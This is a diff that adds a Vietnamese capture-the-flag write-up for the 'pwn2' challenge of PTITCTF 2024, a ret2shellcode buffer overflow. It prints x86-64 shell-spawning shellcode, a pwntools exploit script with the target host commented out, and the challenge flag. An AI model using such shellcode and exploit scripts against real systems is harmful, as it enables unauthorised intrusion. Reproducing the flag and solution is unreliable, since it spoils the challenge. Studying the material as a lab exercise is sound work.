@@ -57,3 +57,36 @@ p.interactive()
 ```PTITCTF{fl0w_fl0w_0v3rfl0w_g3t_w1n}```
 ## Kết luận
 - Đây là dạng bài `ret2win` khá phổ biến trong mảng `pwnable`
+# pwn2
+## Solution
+- Ta thấy có lệnh `mmap` được dùng để tạo một vùng nhớ ảo với kích thước 50 bytes và cấp quyền đọc, ghi, thực thi cho vùng nhớ đó mà không ánh xạ tới file nào
+![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-8.png)
+- Ghi đè biến `buffer` lên biến `a`
+![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-9.png)
+`0x00404094 - 0x00404060 = 0x34`
+-> Vì biến `buffer` đứng trước biến `a` nên chúng ta phải ghi đè 52 bytes + 8 bytes của `0xCAFEBABE`
+- Dùng lệnh `file` để kiểm tra tập tin
+![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-10.png)
+- Vì bài này không có hàm `win` nên chúng ta phải chèn `shellcode`. Lệnh `mmap` có thể sử dụng `ret2shellcode` để yêu cầu server gửi flag. Ta có thể sử dụng file [Linux x86-64 shellcode](https://shell-storm.org/shellcode/files/shellcode-806.html)
+- Ta có payload `\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05` để tiến hành `ret2shellcode`. Viết code để yêu cầu server gửi flag
+```Python
+from pwn import *
+
+# p = remote("14.225.255.41", 13333)
+p = process("./pwn2")
+p.recvuntil("Enter your name: ")
+shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+payload = shellcode
+p.sendline(payload)
+payload = b"a"*52 + p32(0xCAFEBABE)
+
+p.sendline(payload)
+p.interactive()
+```
+![alt text](https://github.com/nhh9905/CTF/blob/main/PTITCTF%202024/V%C3%B2ng%20lo%E1%BA%A1i/Pwnable/image-11.png)
+- Ta đã lấy được shellcode. Remote tới server để lấy flag giống bài `pwn1`
+## Flag
+```PTITCTF{sk3llc0d3_js_byt3c0d3?}```
+## Kết luận
+- Đây là dạng bài `ret2shellcode`
